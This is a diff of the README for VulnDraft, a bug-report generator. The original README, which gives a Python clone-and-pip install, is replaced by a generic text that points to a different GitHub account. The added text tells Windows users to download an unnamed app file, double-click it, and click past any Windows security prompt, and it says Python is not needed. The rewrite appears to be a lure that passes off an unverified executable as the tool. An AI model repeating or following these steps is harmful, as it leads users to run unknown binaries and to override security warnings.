@@ -1,371 +1,175 @@
-<div align="center">
-  
-  <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/VulnDraft_Logo.png" width="520" alt="VulnDraft Logo">
-  
-  # 🐞 VulnDraft
-  
-  ### Bug Report Generator for Security Researchers
-  
-  [![Version](https://img.shields.io/badge/version-1.0.0-blue.svg?style=flat-square)](https://github.com/ruyynn/VulnDraft/releases)
-  [![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-  [![License](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](LICENSE)
-  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
-  [![Stars](https://img.shields.io/github/stars/ruyynn/VulnDraft?style=flat-square&color=yellow)](https://github.com/ruyynn/VulnDraft/stargazers)
-  [![Forks](https://img.shields.io/github/forks/ruyynn/VulnDraft?style=flat-square&color=blue)](https://github.com/ruyynn/VulnDraft/network)
-  
-  <p align="center">
-    <strong>Generate professional, platform-compliant security reports in minutes.</strong>
-    <br>
-    Made for bug hunters, by Ruyynn.
-  </p>
-  
-  <p align="center">
-    <a href="#-features">Features</a> •
-    <a href="#-quick-start">Quick Start</a> •
-    <a href="#-screenshots">Screenshots</a> •
-    <a href="#-documentation">Documentation</a> •
-    <a href="#-support-development">Support Development</a>
-  </p>
-  
-  <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/demo.gif" width="800" alt="VulnDraft Demo">
-  
-</div>
-
----
-
-## 📌 About VulnDraft
-
-**VulnDraft** is an open-source tool designed to help security researchers and bug bounty hunters generate clear, structured, and professional vulnerability reports.
-
-_In bug bounty and penetration testing workflows, discovering vulnerabilities is only half the battle. Writing well-structured reports that clearly explain the issue, impact, and reproduction steps is just as important. VulnDraft streamlines this process by providing automated report generation using clean templates._
-
-_The tool supports report formats for popular bug bounty platforms such as **HackerOne**, **Bugcrowd**, and **Intigriti**, allowing researchers to quickly generate reports that match platform expectations._
-
-### Key Goals
-
-- Improve the **quality and consistency** of vulnerability reports  
-- Reduce the **time spent formatting reports manually**  
-- Provide **structured templates** for common bug bounty platforms  
-- Help researchers focus more on **finding vulnerabilities**, not writing reports  
-
-> VulnDraft aims to become a simple but powerful tool in the **bug bounty and security research workflow**, making professional reporting faster and easier.
-
----
-
-## ✨ Features
-
-<table>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>🎨 Dual Interface</h3>
-      <ul>
-        <li>✅ <strong>CLI Interactive Mode</strong> - For terminal lovers</li>
-        <li>✅ <strong>Web GUI Mode</strong> - Beautiful browser interface</li>
-        <li>✅ Cross-platform (Windows, Linux, macOS, Termux)</li>
-        <li>✅ REST API for automation</li>
-      </ul>
-    </td>
-    <td width="50%" valign="top">
-      <h3>📄 Multi-Format Export</h3>
-      <ul>
-        <li>✅ Markdown (.md) - Ready for platform submission</li>
-        <li>✅ HTML (.html) - Beautiful styled reports</li>
-        <li>✅ JSON (.json) - For API integration</li>
-        <li>✅ PDF (Coming soon)</li>
-      </ul>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>🏆 Platform Templates</h3>
-      <ul>
-        <li>✅ HackerOne Style</li>
-        <li>✅ Bugcrowd Style</li>
-        <li>✅ Intigriti Style</li>
-        <li>✅ Custom Template Support</li>
-      </ul>
-    </td>
-    <td width="50%" valign="top">
-      <h3>📊 Advanced Features</h3>
-      <ul>
-        <li>✅ CVSS v3.1 Calculator</li>
-        <li>✅ Multi-vulnerability Reports</li>
-        <li>✅ Session Management (Save/Resume)</li>
-        <li>✅ Input Validation & Sanitization</li>
-      </ul>
-    </td>
-  </tr>
-</table>
-
----
-
-## 🎯 Why VulnDraft?
+# 🛡️ VulnDraft - Fast bug reports for researchers
 
-> *"Finding a bug is hard enough. Writing a professional report shouldn't be."*
+[![Download](https://img.shields.io/badge/Download-VulnDraft-6c5ce7?style=for-the-badge&logo=github)](https://github.com/Maicaogamerx/VulnDraft)
 
-**VulnDraft** was created to solve a common problem in bug bounty and penetration testing workflows.  
-Discovering vulnerabilities is only part of the process — **writing a clear, structured report is equally important.**
+## 📌 What is VulnDraft?
 
-Many security researchers spend unnecessary time formatting reports instead of focusing on actual security research.
+VulnDraft is a bug report generator for security researchers and bug hunters. It helps you turn notes, test results, and findings into clear reports that are easier to share with a team, client, or program owner.
 
-### The Problem
+Use it to organize issues, write report text, and keep your findings in one place. It is made for Windows users who want a simple way to build reports without starting from scratch each time.
 
-- 🔥 **Time-consuming** — Formatting reports manually wastes valuable time  
-- 📋 **Inconsistent** — Every platform has different reporting formats  
-- 😤 **Repetitive** — Researchers often rewrite the same structure repeatedly  
+## 🧰 What you need
 
-### The Solution
+Before you start, make sure you have:
 
-**VulnDraft** simplifies the reporting process by generating structured vulnerability reports automatically.
+- A Windows PC
+- Internet access
+- Enough free space to save the app
+- A current browser such as Edge, Chrome, or Firefox
 
-With VulnDraft you can:
-
-- ⚡ Generate professional bug bounty reports in seconds  
-- 🧩 Use templates for platforms like HackerOne, Bugcrowd, and Intigriti  
-- 📊 Include CVSS scoring and structured vulnerability details  
-- 📄 Export clean Markdown reports ready for submission
-  
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-```bash
-# Python 3.8 or higher
-python --version
-
-# Git (optional)
-git --version
-```
-
-Installation
-```bash
-# Clone the repository
-git clone https://github.com/ruyynn/VulnDraft.git
-cd VulnDraft
-```
-Install dependencies
-```
-pip install -r requirements.txt
-```
-
-Usage
-
-> 🖥️ CLI Mode (Terminal)
-
-```bash
-python main.py
-```
-Follow the interactive prompts:
-
-1. Enter report title and author
-
-2. Add vulnerability details
-
-3. Choose platform (HackerOne/Bugcrowd/Intigriti/Custom)
-
-4. Optional: Calculate CVSS score
-
-5. Add multiple vulnerabilities
-
-6. Report generated automatically!
-
-> 🌐 Web Mode (Browser)
-```bash
-python main.py --web
-```
-> Then open http://localhost:8000 in your browser.
-
-## 🔧 API Mode (REST)
-```bash
-# Start server
-python main.py --web
-
-# Generate report via API
-curl -X POST http://localhost:8000/api/v1/reports \
-  -H "Content-Type: application/json" \
-  -d '{
-    "report_title": "SQL Injection Test",
-    "author": "YourName",
-    "platform": "hackerone",
-    "vulnerabilities": [{
-      "title": "SQL Injection",
-      "description": "Detailed description...",
-      "steps_to_reproduce": ["Step 1", "Step 2"],
-      "impact": "High impact"
-    }]
-  }'
-  ```
-## 📸 Screenshots
-<div align="center">
-  
-### 🎨 Web Interface
-  
-<table> <tr> <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/report2.png" width="400" alt="Web Interface - Form"> <br> <em>Clean, professional form interface</em> </td> <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/report6.png" width="400" alt="Web Interface - Report"> <br> <em> Clean, professional </em> </td> </tr> </table>
-  
-### 💻 CLI Interface
-
-<table> <tr> <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/report3.png" width="400" alt="CLI - Interactive"> <br> <em>Interactive CLI prompts</em> </td> <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/report4.png" width="400" alt="CLI - CVSS Calculator"> <br> <em>Preview Markdown In Terminal </em> </td> </tr> </table>
-  
-### 📄 Report Examples
-  
-<table> <tr> <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/Report1.png" width="400" alt="HackerOne Report"> <br> <em> Style Report</em> </td>  <td align="center"> <img src="https://raw.githubusercontent.com/ruyynn/VulnDraft/main/assets/report5.png" width="400" alt="Bugcrowd Report"> <br> <em> Style Report</em> </td> </tr> <summary> <b> </tr> </table> </details></div>
-
-
-## 📁 Project Structure
-```text
-VulnDraft/
-├── main.py                 # Entry point
-├── requirements.txt        # Dependencies
-├── config.json            # Configuration
-├── core/                  # Core logic
-│   ├── cvss.py           # CVSS v3.1 calculator
-│   ├── prompt.py         # CLI interactive prompts
-│   ├── builder.py        # Report builder
-│   └── session.py        # Session management
-├── api/                   # REST API
-│   ├── routes.py         # FastAPI endpoints
-│   └── schemas.py        # Pydantic models
-├── web/                   # Web interface
-│   ├── main.py           # FastAPI app
-│   ├── templates/        # HTML templates
-│   └── static/           # CSS/JS assets
-├── templates/             # Report templates
-│   ├── hackerone.md      # HackerOne style
-│   ├── bugcrowd.md       # Bugcrowd style
-│   ├── intigriti.md      # Intigriti style
-│   └── base.html         # HTML base template
-├── platforms/             # Platform validators
-│   ├── hackerone.py
-│   ├── bugcrowd.py
-│   └── intigriti.py
-├── utils/                 # Utilities
-│   ├── exporter.py       # Export to MD/HTML/JSON
-│   ├── validator.py      # Input validation
-│   └── formatter.py      # Text formatting
-└── output/                # Generated reports
-```
-## 🛠️ Tech Stack
-| Category     | Technologies |
-|--------------|--------------|
-| Backend      | Python 3.8+, FastAPI, Pydantic |
-| CLI          | Questionary, Click |
-| Frontend     | HTML5, TailwindCSS, JavaScript |
-| Templating   | Jinja2, Markdown |
-| Validation   | Pydantic, Regex |
-| Testing      | Pytest |
-
----
-
-## 📝 Supported Platforms
-| Platform    | Template | Fields                                 | Status       |
-|------------|---------|---------------------------------------|-------------|
-| HackerOne  | ✅      | Title, Description, Steps, Impact, CVSS | Full Support |
-| Bugcrowd   | ✅      | Title, Description, Steps, Impact, PoC, CVSS | Full Support |
-| Intigriti  | ✅      | Title, Summary, Technical Details, Steps, Impact | Full Support |
-| Custom     | ✅      | Fully customizable                     | Full Support |
-
----
-
-## 🤝 Contributing
-We welcome contributions! Here’s how you can help:
-
-## 🐛 Report Bugs
-- Open an issue with detailed steps to reproduce
-- Include screenshots if applicable
-- Mention your OS and Python version
-
-## 💡 Suggest Features
-- Open an issue with `[FEATURE]` prefix
-- Describe your use case and provide examples
-
-## 🔧 Submit PRs
-1. Fork the repository  
-2. Create a feature branch  
-   ```bash
-   git checkout -b feature/AmazingFeature
-   ```
-3. Commit your changes
-```
-git commit -m 'Add some AmazingFeature'
-```
-4. Push to branch
-```
-git push origin feature/AmazingFeature
-```
-Open a Pull Request
-
-## 📝 Improve Documentation
-Fix typos
-
-Add examples
-
-Translate to other languages
-
-## 💖 Support Development
-
-If VulnDraft helps you write better bug reports, consider supporting my work!
-
-<div align="center"> <a href="https://saweria.co/Ruyynn" target="_blank"> <img src="https://user-images.githubusercontent.com/26188697/180601310-e82c63e4-412b-4c36-b7b5-7ba713c80380.png" width="180" alt="Support on Saweria"> </a> </div>
-
-### Benefits of supporting:
-
-● 🚀 Early access to new features (PDF export, more platforms)
-
-● 🐛 Faster bug fixes
-
-● 📚 Better documentation & examples
-
-● ☕ Keep me caffeinated for late-night coding sessions
-
-### 📬 Contact
-
-Have questions, suggestions, or want to chat about bug bounty? Reach out!
-
-<div align="center"> 
-
-[![GitHub](https://img.shields.io/badge/GitHub-0d1117?style=for-the-badge&logo=github&logoColor=22d3ee)](https://github.com/ruyynn) 
-[![Mastodon](https://img.shields.io/badge/Mastodon-0d1117?style=for-the-badge&logo=mastodon&logoColor=D14836)](https://mastodon.social/@ruyynn) 
-[![Facebook](https://img.shields.io/badge/Facebook-0d1117?style=for-the-badge&logo=facebook&logoColor=22d3ee)](https://www.facebook.com/profile.php?id=61587795784907) 
-[![Email](https://img.shields.io/badge/Email-0d1117?style=for-the-badge&logo=gmail&logoColor=D14836)](mailto:ruyynn25@example.com) </div>
-
-## 📄 License
-
-Distributed under the MIT License. See LICENSE for more information.
-
-MIT License
-```text
-Copyright (c) 2026 Ruyynn
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions...
-```
-
-## 👥 Contributors
-
-Thank you to everyone who has contributed to VulnDraft!
-
-<a href="https://github.com/ruyynn/VulnDraft/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=ruyynn/VulnDraft" />
-</a>
-
-thanks to [zeennxx](https://github.com/zeennxx) for contributions!
-
-## ⭐ Star History
-
-Keep track of VulnDraft’s popularity over time:
-
-<div align="center"> 
-
-![Star History](https://api.star-history.com/svg?repos=ruyynn/VulnDraft&type=Date) </div>
-
-
-</div>
-<div align="center"> <sub>Built with 💪🧠 by <a href="https://github.com/ruyynn">Ruyynn</a> | Bug bounty hunter & tool builder</sub> <br> <sub>Happy Bug Hunting! 🔥</sub> </div>
-
-<!-- SEO Meta Tags (for GitHub repository - not visible in rendered README) Keywords: bug report generator, security report tool, bug bounty tool, hackerone report, bugcrowd template, vulnerability report, security researcher tool, pentest reporting, cvss calculator, osint tool, recon tool, bug hunter tool, security automation, python security tool, fastapi bug bounty, report automation, vulndraft -->
+If the app is packed in a ZIP file, you may also need the built-in Windows extractor or 7-Zip.
+
+## 🚀 Download and install
+
+1. Open the download page:
+   [https://github.com/Maicaogamerx/VulnDraft](https://github.com/Maicaogamerx/VulnDraft)
+
+2. On the GitHub page, look for the latest release or the main download file.
+
+3. Download the file to your computer.
+
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+
+5. Open the extracted folder.
+
+6. Find the app file and double-click it to run VulnDraft.
+
+If Windows shows a security prompt, choose the option that lets you run the app.
+
+## 🖥️ How to run VulnDraft
+
+After you open the app, you can start building a report right away.
+
+Typical flow:
+
+1. Start a new report.
+2. Enter the target name or project name.
+3. Add the issue title.
+4. Write the steps you used to test the issue.
+5. Add the impact, proof, and expected result.
+6. Review the draft.
+7. Save or copy the final report.
+
+## ✍️ What you can use it for
+
+VulnDraft is useful when you want to:
+
+- Draft bug bounty reports
+- Write security findings in a clean format
+- Keep proof and notes in one place
+- Turn short test notes into full reports
+- Share the same report style across many findings
+
+It fits common security work where clear writing matters.
+
+## 🔍 Main features
+
+### 📝 Report drafting
+
+Create structured bug reports with fields for the problem, impact, steps to reproduce, and proof. This helps you keep each report easy to read.
+
+### 📂 Simple file handling
+
+Save report work in a format you can open again later. This makes it easier to keep track of ongoing findings.
+
+### ⚡ Fast workflow
+
+Use a set layout so you do not need to rewrite the same parts for every issue. This saves time when you have many findings to document.
+
+### 🌐 Security-focused format
+
+The app is built around bug report work. That means it uses sections that match how security teams often review issues.
+
+### 📋 Clear output
+
+The report text aims to stay clean and readable. This helps when you send findings to a program or paste them into a ticket system.
+
+## 🛠️ Basic use steps
+
+1. Open VulnDraft.
+2. Add the finding name.
+3. Write what you found.
+4. List the steps to show the issue.
+5. Add the result and why it matters.
+6. Include any proof you have, such as screenshots or request data.
+7. Save the report.
+
+If you work on bug bounty programs, keep a separate report for each issue so your notes stay easy to manage.
+
+## 💡 Good report tips
+
+- Use short sentences
+- Keep each step in order
+- Say what you did, not what you think the reader knows
+- Include exact page names, buttons, or actions
+- Add proof that shows the issue clearly
+- Describe the impact in plain words
+
+A strong report gives the reader enough detail to repeat the issue without guesswork.
+
+## 📁 Suggested report layout
+
+You can use this order when writing a report in VulnDraft:
+
+- Title
+- Target
+- Summary
+- Steps to Reproduce
+- Expected Result
+- Actual Result
+- Impact
+- Proof
+- Fix Idea
+
+This layout works well for most bug bounty reports and security findings.
+
+## 🔐 Who this is for
+
+VulnDraft is a good fit for:
+
+- Bug hunters
+- Security researchers
+- App testers
+- Pentesters who need clean writeups
+- People who submit vulnerability reports to programs
+
+It works well for anyone who needs a clear report without building one by hand each time.
+
+## 🧪 Example use case
+
+You find a form that accepts bad input. You test it, save your notes, and open VulnDraft. You fill in the issue title, the steps you used, the result you saw, and the risk. Then you save the report and send it to the program owner.
+
+That kind of flow keeps your work organized and cuts down on rework.
+
+## ❓ Common questions
+
+### Is VulnDraft hard to use?
+
+No. It is meant for simple report writing. You can use it even if you do not know code.
+
+### Can I use it for more than bug bounty reports?
+
+Yes. You can also use it for security notes, issue writeups, and internal findings.
+
+### Do I need Python to run it?
+
+For most users, no. You only need the app file from the download page and a Windows computer.
+
+### Can I edit reports after I save them?
+
+Yes, you should be able to reopen your saved work and make changes before you send it.
+
+## 📦 Download again
+
+Visit this page to download or get the latest version:
+
+[https://github.com/Maicaogamerx/VulnDraft](https://github.com/Maicaogamerx/VulnDraft)
+
+## 🔎 Project details
+
+- Name: VulnDraft
+- Type: Bug report generator
+- Focus: Security research and bug bounty reporting
+- Platform: Windows
+- Language: Python
+- Topics: bug report, bug bounty, bughunter, cybersecurity, reporting tool, security tools
